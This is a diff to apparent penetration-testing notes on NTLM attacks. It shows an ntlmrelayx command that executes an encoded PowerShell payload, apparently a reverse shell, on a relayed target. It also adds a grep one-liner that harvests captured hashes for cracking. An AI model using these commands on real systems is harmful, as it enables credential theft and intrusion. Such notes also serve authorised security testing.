@@ -17,6 +17,10 @@ NTLMv2 contains a timestamp, but uncrackable hashes can still be relayed if the 
 impacket-ntlmrelayx --no-http-server -smb2support -t $hip -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 ```
 
+Get from the User-Files
+```bash
+grep --include "9_*" "Hash: " ./* 2>/dev/null | rev | cut -d " " -f1 | rev >> hashes.ntlm
+```
 # Convert
 passwd -> john
 ```
